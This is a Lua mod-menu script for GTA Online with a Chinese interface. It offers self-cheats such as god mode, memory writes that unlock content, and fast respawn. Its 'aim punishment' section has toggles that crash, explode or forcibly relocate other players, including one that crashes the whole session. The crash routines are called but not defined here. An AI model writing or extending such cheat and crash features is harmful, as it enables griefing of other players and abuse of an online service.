require "lib.libliblib.natives"
require "lib.libliblib.v3function"
require "lib.libliblib.functions"  
require "lib.libliblib.Playerlib"

JSkey = require 'lib.libliblib.lib.JSkeyLib'
local scaleForm = require'lib.libliblib.lib.ScaleformLib'
local SFasd = scaleForm('instructional_buttons')
local UFO = require "lib.libliblib.UFO"
local HomingMissiles = require "lib.libliblib.Homing_missiles"
local GuidedMissile = require "lib.libliblib.Guided_missile"
local OrbitalCannon = require "lib.libliblib.Orbital_cannon"

local configFile <const> = filesystem.scripts_dir() .. '\\baibaiScript\\'.. "config.ini"

if filesystem.exists(configFile) then
	for s, tbl in pairs(Ini.load(configFile)) do
		for k, v in pairs(tbl) do
			if Config[s] and Config[s][k] ~= nil then Config[s][k] = v end
		end
	end
	util.log("配置已加载")
end

util.keep_running()

local players_root = menu.list(menu.my_root(), "玩家栏", {}, "")

local friends_in_session_list = menu.list_action(players_root, "战局好友", {"friendsinsession"}, "", friends_in_this_session, function(pid, name) menu.trigger_commands("p" .. players.get_name(pid)) end)
local modders_in_session_list = menu.list_action(players_root, "战局作弊者", {"moddersinsession"}, "", modders_in_this_session, function(pid, name) menu.trigger_commands("p" .. players.get_name(pid)) end)

util.create_tick_handler(function()
    for _, pid in players.list(true, true, true) do 
        local hdl = pid_to_handle(pid)
        if NETWORK.NETWORK_IS_FRIEND(hdl) or players.user() == pid then 
            if friends_in_this_session[pid] == nil then
                friends_in_this_session[pid] = players.get_name(pid) .. ' [' .. players.get_tags_string(pid) .. ']'
                menu.set_list_action_options(friends_in_session_list, friends_in_this_session)
            end
        end

        if players.is_marked_as_modder(pid) then 
            if modders_in_this_session[pid] == nil then
                modders_in_this_session[pid] = players.get_name(pid) .. ' [' .. players.get_tags_string(pid) .. ']'
                menu.set_list_action_options(modders_in_session_list, modders_in_this_session)
            end
        end
    end
end)

frendlist = menu.list(menu.my_root(), "好友列表", {"fl"}, "")

menu.divider(frendlist, "好友:)")
for i = 0 , get_friend_count() do
	local name = get_frined_name(i)
	if name == "*****" then goto yes end
	gen_fren_funcs(name)
	::yes::
end

require "lib.libliblib.Spoofprofile"
  
local selflist = menu.list(menu.my_root(), "自我选项", {}, "", function(); end)

local healthandprotex = menu.list(selflist, "生命值与护甲", {}, "", function(); end)

local helperingame = menu.list(selflist, "游戏性选项", {}, "", function(); end)

local funfeatures_self = menu.list(selflist, '玩乐恶搞选项', {}, '')

local aimkarma = menu.list(selflist, "瞄准惩罚", {}, "", function(); end)

menu.divider(healthandprotex, "恢复")

    local self_options_CUSTOM = menu.list(healthandprotex, "自定义血量护甲", {}, "")

    -- -- -- 自定义最大生命值 -- -- --
    menu.divider(self_options_CUSTOM, "Health")

    
    menu.toggle(self_options_CUSTOM, "自定义最大生命值", {}, "改变你的最大生命值。一些菜单会将你标记为作弊者。当它被禁用时，它会返回到默认的最大生命值。", function(toggle)
        custom_health(toggle)
    util.create_tick_handler(function()
        if PED.GET_PED_MAX_HEALTH(PLAYER.PLAYER_PED_ID()) ~= moddedHealth then
            PED.SET_PED_MAX_HEALTH(PLAYER.PLAYER_PED_ID(), moddedHealth)
            ENTITY.SET_ENTITY_HEALTH(PLAYER.PLAYER_PED_ID(), moddedHealth)
        end
        return UsingModHealth
    end)
end)

    moddedHealthSlider = menu.slider(self_options_CUSTOM, "最大生命值", { "rsetmaxhealth" }, "生命值将被修改为指定的数值", 50, 30000, defaultHealth, 50, function(value)
        setcustomhealth(value)
    end)
    
    -- -- -- 自定义最大护甲 -- -- --
menu.divider(self_options_CUSTOM, "Armour")

    menu.toggle(self_options_CUSTOM, "自定义最大护甲值", {}, "改变你的最大护甲值。一些菜单会将你标记为作弊者。当它被禁用时，它会返回到默认的最大护甲值。", function(toggle)
        custom_armor(toggle)
    util.create_tick_handler(function()
        if PLAYER.GET_PLAYER_MAX_ARMOUR(PLAYER.PLAYER_ID()) ~= moddedArmour then
            PLAYER.SET_PLAYER_MAX_ARMOUR(PLAYER.PLAYER_ID(), moddedArmour)
        end
        return UsingModArmour
    end)
end)
    
    moddedArmourSlider = menu.slider(self_options_CUSTOM, "最大护甲值", { "rsetmaxarmour" }, "护甲将被修改为指定的数值", 50, 30000, defaultArmour, 50, function(value)
        setcustomarmor(value)
    end)

    -----
    local self_options_CUSTOM_refill = menu.list(healthandprotex, "自定义生命恢复", {}, "")
    
    -- 正常状态
    menu.divider(self_options_CUSTOM_refill, "站立不动状态")

    menu.toggle(self_options_CUSTOM_refill, "功能开启", {}, "", function(toggle)
    standhealthon(toggle)
    end)
    
    menu.slider(self_options_CUSTOM_refill, "恢复程度", { "normal_refill_limit" }, "恢复到血量的多少，单位%\n默认：25%", 1, 100, 25, 10, function(value)
        standhpmode(value)
    end)
    
    menu.slider(self_options_CUSTOM_refill, "恢复速度", { "normal_refill_mult" }, "恢复速度\n默认：1.0", 1.0, 100.0, 1.0, 1.0, function(value)
        standhpmodetime(value)
    end)
    
    -- 掩体状态
    menu.divider(self_options_CUSTOM_refill, "掩体状态")
    
    
    menu.toggle(self_options_CUSTOM_refill, "功能开启", {}, "", function(toggle)
        hidehealthon(toggle)
    end)
    
    menu.slider(self_options_CUSTOM_refill, "恢复程度", { "cover_refill_limit" }, "恢复到血量的多少，单位%\n默认：25%", 1, 100, 25, 10, function(value)
        hidehpmode(value)
    end)
    
    menu.slider(self_options_CUSTOM_refill, "恢复速度", { "cover_refill_mult" }, "恢复速度\n默认：1.0", 1.0, 100.0, 1.0, 1.0, function(value)
        hidehpmodetime(value)
    end)
    
    ------

menu.action(healthandprotex, "补充血量", {"maxhealth"}, "", function()
	ENTITY.SET_ENTITY_HEALTH(players.user_ped(), PED.GET_PED_MAX_HEALTH(players.user_ped()), 0)
end)

menu.action(healthandprotex, "补充护甲", {"maxarmour"}, "", function()
    if util.is_session_started() then
		PED.SET_PED_ARMOUR(players.user_ped(), 50)
	else
		PED.SET_PED_ARMOUR(players.user_ped(), 100)
	end
end)

menu.toggle_loop(healthandprotex, '自动加血', {'JSfullRegen'}, '一直加血直到您的血被加满.', function()
    autocover()
end)

menu.toggle_loop(healthandprotex, "在掩体后时补充生命值", {"healincover"}, "", function()
    healthincover()
end, function ()
	PLAYER.SET_PLAYER_HEALTH_RECHARGE_MAX_PERCENT(players.user(), 0.25)
	PLAYER.SET_PLAYER_HEALTH_RECHARGE_MULTIPLIER(players.user(), 1.0)
end)

---
local toLockHealth = defaultHealth * 0.5
menu.toggle(healthandprotex, "当血量过低时锁定", {}, "当你的血量低于你设置的值后，锁定你的血量，以免死亡", function(toggle)
    islockHealth = toggle
    local localPed = PLAYER.PLAYER_PED_ID()
    local currentHealth
    util.create_tick_handler(function()
        if islockHealth then
            currentHealth = ENTITY.GET_ENTITY_HEALTH(localPed)
            if currentHealth < toLockHealth then
                ENTITY.SET_ENTITY_HEALTH(localPed, toLockHealth)
            end
        end
    end)
end)

lockHealthSlider = menu.slider(healthandprotex, "低于多少%血量", { "rlockhealth" }, "锁定前到达的最低血量，单位%", 10, 100, 50, 10, function(value)
    local maxHealth = ENTITY.GET_ENTITY_MAX_HEALTH(PLAYER.PLAYER_PED_ID())
    toLockHealth = maxHealth * value / 100
end)

------
menu.divider(healthandprotex, "通知")

menu.action(healthandprotex, "通知当前血量和最大血量", {}, "", function()
    notifyhealth()
end)

menu.action(healthandprotex, "通知当前护甲和最大护甲", {}, "", function()
    notifyarmor()
end)
    
    local proofsList = menu.list(selflist, "伤害避免", {}, "自定义无敌")
    local immortalityCmd = menu.ref_by_path("Self>Immortality")
    for _,data in pairs(proofs) do
        menu.toggle(proofsList, data.name, {data.name:lower().."proof"}, "让您对"..data.name:lower().."伤害避免", function(toggle)
            data.on = toggle
        end)
    end
    util.create_tick_handler(function()
        local local_player = players.user_ped()
        if not menu.get_value(immortalityCmd) then
            ENTITY.SET_ENTITY_PROOFS(local_player, proofs.bullet.on, proofs.fire.on, proofs.explosion.on, proofs.collision.on, proofs.melee.on, proofs.steam.on, false, proofs.drown.on)
        end
    end)

local muggerWarning
muggerWarning = menu.action(helperingame, "金钱清除", {}, "", function(click_type)
    menu.show_warning(muggerWarning, click_type, "警告: 请三思您的举措，一旦您使用，改变就无法撤消，你的钱就会清空. 仅在您打算摆脱金钱时使用", function()
        menu.delete(muggerWarning)
        local muggerList = menu.list(self, "金钱清除")
        local price = 1000
        menu.click_slider(muggerList, "清除金额", {"muggerprice"}, "", 0, 2000000000, 0, 1000, function(value)
            price = value
        end)

        menu.toggle_loop(muggerList, "应用", {}, "点击后给拉玛打电话请求劫匪,请求后您设置的对应金额就会清除", function()
            memory.write_int(memory.script_global(262145 + 4121), price) 
        end)
        menu.trigger_command(muggerList)
    end)
end)


menu.list_action(funfeatures_self, "获取鸡巴", {}, "请选择你的鸡巴", opt_pp, function(index, value, click_type)
    getbigjb(index, value, click_type)
end)


local _LR = menu.list(funfeatures_self, '火翅膀', {}, '')

        
        menu.toggle(_LR, '火翅膀', {'JSfireWings'}, '将火制成的翅膀附加在您的背上.', function (toggle)
            firewing(toggle)
        end)

        menu.slider(_LR, '火翅膀比例', {'JSfireWingsScale'}, '', 1, 100, 3, 1, function(value)
            firewingscale(value)
        end)

        menu.rainbow(menu.colour(_LR, '火翅膀颜色', {'JSfireWingsColour'}, '', fireWingsSettings.colour, false, function(colour)
            firewingcolour(colour)
        end))


    local firebreath = menu.list(funfeatures_self, '喷火', {}, '')


    menu.toggle(firebreath, '喷火', {'JSfireBreath'}, '', function(toggle)
        firebreathxxx(toggle)
    end)

    menu.slider(firebreath, '喷火比例', {'JSfireBreathScale'}, '', 1, 100, fireBreathSettings.scale * 10, 1, function(value)
        firebreathscale(value)
    end)

    menu.rainbow(menu.colour(firebreath, '喷火颜色', {'JSfireBreathColour'}, '', fireBreathSettings.colour, false, function(colour)
        firebreathcolour(colour)
    end))

    local bones <const> = {
        0x49D9,	-- left hand
        0xDEAD,	-- right hand
        0x3779,	-- left foot
        0xCC4D	-- right foot
    }
    local colour = {r = 1.0, g = 0.0, b = 1.0, a = 1.0}
    local timer <const> = newTimer()
    local trailsOpt <const> = menu.list(selflist,"轨迹"), {}, ""
    local effect <const> = Effect.new("scr_rcpaparazzo1", "scr_mich4_firework_sparkle_spawn")
    local effects = {}
    
    menu.toggle_loop(trailsOpt,"轨迹", {"trails"}, "", function ()
        if not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(effect.asset) then
            STREAMING.REQUEST_NAMED_PTFX_ASSET(effect.asset)
            return
        end
        if timer.elapsed() >= 1000 then
            removeFxs(effects); effects = {}
            timer.reset()
        end
        if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) then
            local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
            local minimum, maximum = v3.new(), v3.new()
            MISC.GET_MODEL_DIMENSIONS(ENTITY.GET_ENTITY_MODEL(vehicle), minimum, maximum)
            local offsets <const> = {v3(minimum.x, minimum.y, 0.0), v3(maximum.x, minimum.y, 0.0)}
            for _, offset in ipairs(offsets) do
                GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
                local fx =
                GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY(
                    effect.name,
                    vehicle,
                    offset.x,
                    offset.y,
                    0.0,
                    0.0,
                    0.0,
                    0.0,
                    0.7, --scale
                    false, false, false,
                    0, 0, 0, 0
                )
                GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fx, colour.r, colour.g, colour.b, 0)
                table.insert(effects, fx)
            end
        elseif ENTITY.DOES_ENTITY_EXIST(players.user_ped()) then
            for _, boneId in ipairs(bones) do
                GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
                local fx =
                GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE(
                    effect.name,
                    players.user_ped(),
                    0.0,
                    0.0,
                    0.0,
                    0.0,
                    0.0,
                    0.0,
                    PED.GET_PED_BONE_INDEX(players.user_ped(), boneId),
                    0.7, --scale
                    false, false, false,
                    0, 0, 0, 0
                )
                GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fx, colour.r, colour.g, colour.b, 0)
                table.insert(effects, fx)
            end
        end
    end, function ()
        removeFxs(effects); effects = {}
    end)
    
    local trailColour = menu.colour(trailsOpt,"颜色", {"trailcolour"}, "", colour, false, function(newColour)
         colour = newColour 
    end)
    menu.rainbow(trailColour)
    
    local ragdoll = menu.list(selflist, '摔倒选项', {'JSragdollOptions'}, '选择不同的摔倒选项.')

    menu.toggle_loop(ragdoll, '笨拙', {'JSclumsy'}, '让您的人物很容易摔倒.', function()
        clumsy()
    end)

    menu.action(ragdoll, '绊倒', {'JSstumble'}, '让你绊倒,很可能会摔倒.', function()
        stumble()
    end)

    local fallTimeout = false
    menu.toggle(ragdoll, '倒下', {'JSfallOver'}, '让您绊倒、跌倒并阻止您站起来.', function(toggle)
        if toggle then
            local vector = ENTITY.GET_ENTITY_FORWARD_VECTOR(players.user_ped())
            PED.SET_PED_TO_RAGDOLL_WITH_FALL(players.user_ped(), 1500, 2000, 2, vector.x, -vector.y, vector.z, 1, 0, 0, 0, 0, 0, 0)
        end
        fallTimeout = toggle
        while fallTimeout do
            PED.RESET_PED_RAGDOLL_TIMER(players.user_ped())
            util.yield_once()
        end
    end)

    menu.toggle_loop(ragdoll, '摔倒', {'JSragdoll'}, '让您的人物摔倒.', function()
        ragdoll_self()
    end)

local cus_respawn = menu.list(selflist, '自定义复活', {}, '')

custom_respawn_toggle = menu.toggle_loop(cus_respawn, '自定义复活' ..': '.. 'none', {}, '设置你死后重生的位置.', function()
    custom_respawn()
end)

custom_respawn_location = menu.action(cus_respawn, '保存位置', {}, '未设置位置.', function()
    save_custom_respawn()
end)

local unlocks = menu.list(selflist, "解锁", {}, "")

menu.toggle_loop(unlocks, "50辆载具车库", {}, "", function()
    if memory.read_byte(memory.script_global(262145 + 32688)) ~= 0 then
        memory.write_byte(memory.script_global(262145 + 32688), 0) 
    end

    if memory.read_byte(memory.script_global(262145 + 32702)) ~= 1 then
        memory.write_byte(memory.script_global(262145 + 32702), 1)  
    end
end)

menu.action(unlocks, "毒品战争内容", {}, "", function()
    for i = 33974, 34112, 1 do
        memory.write_byte(memory.script_global(262145 + i), 1)  
    end
end)

menu.action(unlocks, "圣诞和新年礼物", {}, "", function()
    memory.write_byte(memory.script_global(262145 + 33915), 1)  
    memory.write_byte(memory.script_global(262145 + 33916), 1)  
end)

menu.toggle_loop(helperingame, "假死雷达（地图上不显示你）", {"undeadotr"}, "", function()
    undead()
end, function ()
	ENTITY.SET_ENTITY_MAX_HEALTH(players.user_ped(), maxHealth_cantseeyouinmap)
end)

menu.toggle_loop(helperingame, "PVP防御模式", {}, "", function()
    pvpdefmode()
end)

menu.toggle_loop(helperingame, "快速重生", {""}, "", function()
    local ped_ptr = entities.handle_to_pointer(players.user_ped())
    local gwobaw = memory.script_global(2672505 + 1684 + 756) -- Global_2672505.f_1684.f_756
    if entities.get_health(ped_ptr) < 100 then
        GRAPHICS.ANIMPOSTFX_STOP_ALL()
        memory.write_int(gwobaw, memory.read_int(gwobaw) | 1 << 1)
    end
end,
    function()
    local gwobaw = memory.script_global(2672505 + 1684 + 756)
    memory.write_int(gwobaw, memory.read_int(gwobaw) &~ (1 << 1)) 
end)

menu.toggle_loop(helperingame, "武装玩家", {"ghostarmedplayers"}, "对手持武器的玩家启用幽灵模式.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        if WEAPON.IS_PED_ARMED(ped, 7) or TASK.GET_IS_TASK_ACTIVE(ped, 199) or TASK.GET_IS_TASK_ACTIVE(ped, 128) 
        or IsPlayerUsingGuidedMissile(pid) or IsPlayerInRcTank(pid) or IsPlayerInRcBandito(pid) or IsPlayerFlyingAnyDrone(pid) then
            NETWORK.SET_REMOTE_PLAYER_AS_GHOST(pid, true)
        else
            NETWORK.SET_REMOTE_PLAYER_AS_GHOST(pid, false)
        end
    end
end, function()
    for _, pid in ipairs(players.list(false, true, true)) do
        NETWORK.SET_REMOTE_PLAYER_AS_GHOST(pid, false)
    end
end)

local orb = menu.list(helperingame, "反天基炮")
ghost_tgl = menu.toggle_loop(orb, "幽灵模式", {"ghostorb"}, "自动对使用天基炮的玩家开启幽灵模式.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        if IsPlayerUsingOrbitalCannon(pid) and TASK.GET_IS_TASK_ACTIVE(ped, 135) 
        and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), cam_pos) > 300 
        and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), cam_pos) < 400 then
            util.toast(players.get_name(pid) .. " 正在用天基炮瞄准你.")
        end
       if IsPlayerUsingOrbitalCannon(pid) then
            NETWORK.SET_REMOTE_PLAYER_AS_GHOST(pid, true)
        else
            NETWORK.SET_REMOTE_PLAYER_AS_GHOST(pid, false)
        end
    end
end, function()
    for _, pid in ipairs(players.list(false, true, true)) do
        NETWORK.SET_REMOTE_PLAYER_AS_GHOST(pid, false)
    end
end)

local annoy = menu.list(orb, "防御模式", {}, "快速显示你的名字并将其从目标玩家天基炮选择列表中删除.")
local orb_delay = 1000
menu.list_select(annoy, "延迟", {}, "对于天基炮玩家来说，你的名字会以何种速度闪动.", {"慢速", "中速", "快速"}, 1, function(index, value)
switch value do
    case "慢速":
        orb_delay = 1000
        break
    case "中速":
        orb_delay = 500
        break
    case "快速":
        orb_delay = 100
        break
    end
end)

local annoy_tgl
annoy_tgl = menu.toggle_loop(annoy, "启用", {}, "", function()
    if menu.get_value(ghost_tgl) then
        menu.set_value(annoy_tgl, false)
        util.toast("请不要同时启用防御模式和幽灵模式 ;)")
    return end
    
    for _, pid in ipairs(players.list(false, true, true)) do
       if IsPlayerUsingOrbitalCannon(pid) then
            NETWORK.SET_REMOTE_PLAYER_AS_GHOST(pid, true)
            util.yield(orb_delay)
            NETWORK.SET_REMOTE_PLAYER_AS_GHOST(pid, false)
            util.yield(orb_delay)
        else
            NETWORK.SET_REMOTE_PLAYER_AS_GHOST(pid, false)
        end
    end
end, function()
    for _, pid in ipairs(players.list(false, true, true)) do
        NETWORK.SET_REMOTE_PLAYER_AS_GHOST(pid, false)
    end
end)

menu.toggle_loop(helperingame, "友好的AI", {""}, "AI不会瞄准你.", function()
    PED.SET_PED_RESET_FLAG(players.user_ped(), 124, true)
end)

menu.toggle_loop(helperingame, "自动接受并加入游戏", {}, "将自动接受加入任务", function()
    autoaccept()
end)

menu.toggle_loop(helperingame, "强制脚本主机", {}, "更快获取脚本主机", function()
    scripthost_get()
end)

menu.toggle_loop(helperingame, "自动获取主机", {"hhost"}, "自动获取主机", function()
    autogethost()
end)

local startViewMode
local scope_scaleform
local gaveHelmet = false
menu.toggle_loop(funfeatures_self, '钢铁侠模式', {'JSironman'}, '赋予你钢铁侠的能力 :)', function()
    if not menu.get_value(levitationCommand) then
        menu.trigger_command(levitationCommand)
    end

    if not PED.IS_PED_WEARING_HELMET(players.user_ped()) then
        PED.GIVE_PED_HELMET(players.user_ped(), true, 4096, -1)
        gaveHelmet = true
    end

    local context = CAM.GET_CAM_ACTIVE_VIEW_MODE_CONTEXT()
    if startViewMode == nil then
        startViewMode = CAM.GET_CAM_VIEW_MODE_FOR_CONTEXT(context)
    end

    if CAM.GET_CAM_VIEW_MODE_FOR_CONTEXT(context) != 4 then
        CAM.SET_CAM_VIEW_MODE_FOR_CONTEXT(context, 4)
    end

    scope_scaleform = GRAPHICS.REQUEST_SCALEFORM_MOVIE('REMOTE_SNIPER_HUD')
    GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scope_scaleform, 'REMOTE_SNIPER_HUD')
    GRAPHICS.DRAW_SCALEFORM_MOVIE_FULLSCREEN(scope_scaleform, 255, 255, 255, 255, 0)
    GRAPHICS.END_SCALEFORM_MOVIE_METHOD()

    local barrageInput = 'INPUT_PICKUP'
    if not PAD.IS_USING_KEYBOARD_AND_MOUSE(0) then
        barrageInput = 'INPUT_COVER'
    end

    memory.write_int(memory.script_global(1649593 + 1163), 1)
    SFasd.CLEAR_ALL()
    SFasd.TOGGLE_MOUSE_BUTTONS(false)
    SFasd.SET_DATA_SLOT(2, JSkey.get_control_instructional_button(0, 'INPUT_ATTACK'), '爆炸')
    SFasd.SET_DATA_SLOT(1, JSkey.get_control_instructional_button(0, 'INPUT_AIM'), '光束')
    SFasd.SET_DATA_SLOT(0, JSkey.get_control_instructional_button(0, barrageInput), '弹幕')
    SFasd.DRAW_INSTRUCTIONAL_BUTTONS()

    JSkey.disable_control_action(2, 'INPUT_VEH_MOUSE_CONTROL_OVERRIDE')
    JSkey.disable_control_action(2, 'INPUT_VEH_FLY_MOUSE_CONTROL_OVERRIDE')
    JSkey.disable_control_action(2, 'INPUT_VEH_SUB_MOUSE_CONTROL_OVERRIDE')

    JSkey.disable_control_action(0, 'INPUT_ATTACK')
    JSkey.disable_control_action(0, 'INPUT_AIM')

    if not (JSkey.is_disabled_control_pressed(0, 'INPUT_ATTACK') or JSkey.is_disabled_control_pressed(0, 'INPUT_AIM') or JSkey.is_disabled_control_pressed(0, barrageInput)) then return end

    local a = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    local b = getOffsetFromCam(80)

    local hash
    if JSkey.is_disabled_control_pressed(0, 'INPUT_ATTACK') then
        hash = util.joaat('VEHICLE_WEAPON_PLAYER_LAZER')
        if not WEAPON.HAS_WEAPON_ASSET_LOADED(hash) then
            WEAPON.REQUEST_WEAPON_ASSET(hash, 31, 26)
            while not WEAPON.HAS_WEAPON_ASSET_LOADED(hash) do
                util.yield()
            end
        end
    elseif JSkey.is_disabled_control_pressed(0, 'INPUT_AIM') then
        hash = util.joaat('WEAPON_RAYPISTOL')
        if not WEAPON.HAS_PED_GOT_WEAPON(players.user_ped(), hash, false) then
            WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), hash, 9999, false, false)
        end
    else
        hash = util.joaat('WEAPON_RPG')
        if not WEAPON.HAS_PED_GOT_WEAPON(players.user_ped(), hash, false) then
            WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), hash, 9999, false, false)
        end
        a.x += math.random(0, 100) / 100
        a.y += math.random(0, 100) / 100
        a.z += math.random(0, 100) / 100
    end

    WEAPON.SET_CURRENT_PED_WEAPON(players.user_ped(), util.joaat('WEAPON_UNARMED'), true)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(
        a.x, a.y, a.z,
        b.x, b.y, b.z,
        200,
        true,
        hash,
        PLAYER.PLAYER_PED_ID(),
        true, true, -1.0
    )
end, function()
    if gaveHelmet then
        PED.REMOVE_PED_HELMET(players.user_ped(), true)
        gaveHelmet = false
    end
    HUD.HUD_SHOWING_CHARACTER_SWITCH_SELECTION(false)
    local pScaleform = memory.alloc_int()
    memory.write_int(pScaleform, scope_scaleform)
    GRAPHICS.SET_SCALEFORM_MOVIE_AS_NO_LONGER_NEEDED(pScaleform)
    menu.trigger_command(levitationCommand, 'off')
    util.yield()
    CAM.SET_CAM_VIEW_MODE_FOR_CONTEXT(CAM.GET_CAM_ACTIVE_VIEW_MODE_CONTEXT(), startViewMode)
    startViewMode = nil
end)


local lsrmenu = menu.list(funfeatures_self, '激光眼', {}, '')

menu.toggle_loop(lsrmenu, '激光眼', {'Leyeson'}, '从你的眼睛射出激光也适用于车辆', function (on)
    laser_eyes(on)
end)

menu.toggle(lsrmenu, '爆炸', {'leexp'}, '用激光眼打开爆炸', function (on)
    lazer_gun_exp(on)
end)

menu.list_select(lsrmenu, '更改爆炸子弹', {'lebullets'}, '更改用于激光眼的子弹', Leyen, 1, function (bulsel)
    lazer_gun_exp_change(bulsel) 
end)

menu.toggle_loop(funfeatures_self, '极限跳跃', {}, '按跳跃的时间越长，越往上飞（也可用于飞行）', function ()
    if PAD.IS_CONTROL_PRESSED(0, 22) then
        PED.SET_PED_CAN_RAGDOLL(players.user_ped(), false)
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(players.user_ped(), 1, 0.5, 0.5, 0.5, 0, 0, 0, 0, true, true, true, true)
    end
end)


local bigbarrelqq = false
    menu.toggle(funfeatures_self, "大锤", {"bighammer"}, "", function(on)
        if on then
            WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1810795771,15,true,true)
            local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(),true)
            dachui = OBJECT.CREATE_OBJECT(util.joaat("prop_glass_stack_03"), pos.x, pos.y, pos.z, true, true, false)--prop_gate_farm_post
            tongzi = OBJECT.CREATE_OBJECT(util.joaat("prop_barrel_pile_03"), pos.x, pos.y, pos.z, true, true, false)--h4_prop_h4_barrel_01a
            menu.trigger_commands("damagemultiplier 1000")
            menu.trigger_commands("rangemultiplier 1.5")
            ENTITY.ATTACH_ENTITY_TO_ENTITY(dachui, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.2, 0.95, 0.2, 105, 30.0, 0, true, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(tongzi,dachui, 0,  0, 0, -0.2, -35.0, 100.0,0, true, true, false, false, 0, true)
            util.yield(1000)
            bigbarrelqq = on
        else
        menu.trigger_commands("damagemultiplier 1")
        menu.trigger_commands("rangemultiplier 1")
        entities.delete_by_handle(dachui)
        entities.delete_by_handle(tongzi)
        bigbarrelqq = off
        WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(),-1810795771)
    end
end,false)

menu.toggle_loop(funfeatures_self, "上帝之指", {"godfinger"}, "移动实体当你用手指指向他们时。按B键开始指向。", function()
    godfinger()
end)

local roll_speed = nil
menu.list_select(funfeatures_self, "战斗翻滚速度", {}, "", {"默认", "1.25x", "1.5x", "1.75x", "2x"}, 1, function(index, value)
roll_speed = index
util.create_tick_handler(function()
    switch value do
        case "1.25x":
            STATS.STAT_SET_INT(util.joaat("MP"..util.get_char_slot().."_SHOOTING_ABILITY"), 115, true)
            break
        case "1.5x":
            STATS.STAT_SET_INT(util.joaat("MP"..util.get_char_slot().."_SHOOTING_ABILITY"), 125, true)
            break
        case "1.75x":
            STATS.STAT_SET_INT(util.joaat("MP"..util.get_char_slot().."_SHOOTING_ABILITY"), 135, true)
            break
        case "2x":
            STATS.STAT_SET_INT(util.joaat("MP"..util.get_char_slot().."_SHOOTING_ABILITY"), 150, true)
            break
        end
        return roll_speed == index
    end)
end)


local climb_speed = nil
menu.list_select(funfeatures_self, "攀爬速度", {}, "", {"默认", "1.25x", "1.5x", "2x",}, 1, function(index, value)
climb_speed = index
util.create_tick_handler(function()
    if TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 1) then
        switch value do
            case "1.25x":
                PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(players.user_ped())
                util.yield(150)
                break
            case "1.5x":
                PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(players.user_ped())
                util.yield(75)
                break
            case "2x":
                PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(players.user_ped())
                util.yield(50)
                break
            end
        end
        return climb_speed == index
    end)
end)

menu.slider(selflist, '幽灵', {'JSghost'}, '修改您人物的不透明度.', 0, 100, 100, 25, function(value)
    ENTITY.SET_ENTITY_ALPHA(players.user_ped(), JS_tbls.alphaPoints[value / 25 + 1], false)
end)


menu.toggle(selflist, '冷血', {'JScoldBlooded'}, '移除您的热信号.\n其他人仍然可以看到它.', function(toggle)
    PED.SET_PED_HEATSCALE_OVERRIDE(players.user_ped(), (toggle and 0 or 1))
end)

menu.toggle_loop(aimkarma, '发送脚本事件崩溃', {''}, '如果他瞄准你自动崩溃', function()
    sendscriptcrash()
end)

menu.toggle_loop(aimkarma, '拉海滩', {''}, '自动拉海滩', function()
    sendgobreach()
end)

menu.toggle_loop(aimkarma, '无差别崩', {''}, '如果有sb打你,无差别崩溃全局', function()
    sendallplayercrash()
end)

menu.toggle_loop(aimkarma, '射击', {'JSbulletAimKarma'}, '射击瞄准您的玩家.', function()
    bulletaimkarma()
end)

menu.toggle_loop(aimkarma, '爆炸', {'JSexpAimKarma'}, '使用您的自定义爆炸设置爆炸玩家.', function()
    expaimkarma()
end)

menu.toggle_loop(aimkarma, '禁用无敌', {'JSgodAimKarma'}, '如果开着无敌的玩家瞄准你,这会通过向前推动他们的游戏画面来禁用他们的无敌模式.', function()
    godaimkarma()
end)

menu.action(aimkarma, 'Stand玩家瞄准惩罚', {}, '连接到Stand的玩家瞄准惩罚', function()
    menu.focus(menu.ref_by_path('World>Inhabitants>Player Aim Punishments>Anonymous Explosion', 37))
end)

menu.toggle(selflist, '无声脚步', {'JSquietSteps'}, '禁用您的脚步声.', function(toggle)
    AUDIO.SET_PED_FOOTSTEPS_EVENTS_ENABLED(players.user_ped(), not toggle)
end)

menu.toggle(funfeatures_self, "雪人",{""}, "",function(on)
    snowpeople(on)
end)

menu.toggle(funfeatures_self, "火人", {"fireman"}, "请关掉无敌", function(on)
    firepersonl(on)
end)
	
menu.toggle_loop(funfeatures_self, "发光", {"bodylight"}, "", function()
    personllight()
end)     

menu.toggle_loop(funfeatures_self, "设置力场", {"forcefield"}, "", function()
	forcefielddd()
end, function()
	set_explosion_proof(players.user_ped(), false)
end)


menu.textslider_stateful(funfeatures_self, "力场", {}, "", options_force, function(index)
	forcefield_set(index)
end)

menu.toggle_loop(funfeatures_self, "原力", {"jedimode"}, "在附近的车辆上使用绝地武士原力", function()
	jedmode()
end, function()
	state = 0
end)

